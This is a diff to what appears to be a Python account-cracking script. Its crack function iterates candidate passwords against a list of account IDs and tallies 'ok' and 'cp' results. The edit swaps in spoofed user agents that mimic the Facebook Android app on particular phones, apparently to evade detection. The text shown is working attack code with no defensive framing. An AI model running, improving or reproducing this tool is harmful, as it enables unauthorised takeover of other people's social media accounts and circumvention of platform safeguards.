@@ -695,8 +695,8 @@ def crack(idf,pwv):
 	pers = loop*100/len(id2)
 	fff = '%'
 	print('\r%s%s/%s ok : %s cp : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
-	ua = 'Mozilla/5.0 (Linux; Android 12; 21121210G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]	Android 12	Facebook'
-	ua2 = 'Mozilla/5.0 (Linux; Android 12; 21121210G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]	Android 12	Facebook'
+	ua = 'Mozilla/5.0 (Linux; Android 12; 21121210G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 FB_IAB/FB4A;FBAV/383.1.0.25.106'
+	ua2 = 'Mozilla/5.0 (Linux; Android 11; TECNO AC8 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 FB_IAB/FB4A;FBAV/384.1.0.29.111'
 	ses = requests.Session()
 	for pw in pwv:
 		try:
